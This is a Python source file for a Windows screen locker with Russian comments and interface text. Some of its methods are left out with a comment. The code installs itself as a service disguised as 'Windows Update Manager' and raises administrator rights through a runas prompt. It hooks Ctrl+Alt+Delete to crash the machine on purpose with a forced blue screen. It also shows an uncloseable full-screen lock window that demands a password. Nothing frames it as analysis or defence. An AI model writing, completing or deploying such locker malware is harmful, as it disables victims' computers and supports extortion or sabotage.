import sys
import os
import ctypes
import winreg
import keyboard
from tkinter import *
from subprocess import Popen as cmd, run
import win32serviceutil
import win32service
import win32event
import servicemanager
import threading
import time

class WinLockerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "WinLockerService"
    _svc_display_name_ = "Windows Update Manager"
    _svc_description_ = "Системный менеджер обновлений"

    def __init__(self, args):
        if not isinstance(args, list):
            args = [args]
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.stop_event = threading.Event()
        self.root = None

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.stop_event.set()
        win32event.SetEvent(self.hWaitStop)
        if self.root:
            self.root.after(100, self.root.destroy)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                            servicemanager.PYS_SERVICE_STARTED,
                            (self._svc_name_, ''))
        self.main()

    def main(self):
        try:
            # Инициализация блокировок
            keyboard.add_hotkey("ctrl+alt+delete", self.trigger_bsod, suppress=True)
            self.block_system()

            # GUI интерфейс
            if not servicemanager.RunningAsService():
                self.run_gui()
            
            while not self.stop_event.is_set():
                time.sleep(1)

        except Exception as e:
            with open('C:\\locker_log.txt', 'a') as f:
                f.write(f"Error: {str(e)}\n")

    def run_gui(self):
        self.root = Tk()
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        
        Label(self.root, text="СИСТЕМА ЗАБЛОКИРОВАНА", fg="red", bg="black", font=("Arial", 24)).pack(pady=50)
        Label(self.root, text="Введите пароль для разблокировки:", fg="white", bg="black", font=("Arial", 16)).pack()

        self.password_entry = Entry(self.root, font=("Arial", 16), show="*")
        self.password_entry.pack(pady=20)

        Button(self.root, text="Разблокировать", command=self.check_password).pack()
        self.root.mainloop()

    def trigger_bsod(self):
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        except Exception as e:
            with open('C:\\bsod_log.txt', 'a') as f:
                f.write(f"BSOD failed: {str(e)}\n")

    # ... (остальные методы block_system, check_password, unblock_system остаются без изменений)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
        
        service = WinLockerService(sys.argv)
        if not servicemanager.RunningAsService():
            service.run_gui()
    elif sys.argv[1] == "install":
        win32serviceutil.HandleCommandLine(WinLockerService)
    elif sys.argv[1] == "debug":
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(WinLockerService)
        servicemanager.StartServiceCtrlDispatcher()